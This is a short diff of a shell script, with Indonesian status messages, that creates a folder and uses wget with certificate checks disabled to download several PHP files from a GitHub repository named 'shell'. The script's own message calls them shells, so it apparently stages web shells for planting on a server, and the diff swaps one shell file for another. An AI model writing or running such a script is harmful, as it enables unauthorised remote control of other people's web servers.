@@ -33,7 +33,7 @@ sleep 3
 mkdir x
 
 echo -e "\e[32mMengunduh shell ke dalam folder 'x'...\e[0m"
-wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/xf.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/lph.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/us.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/oxygencall/shell/main/hd.php
 
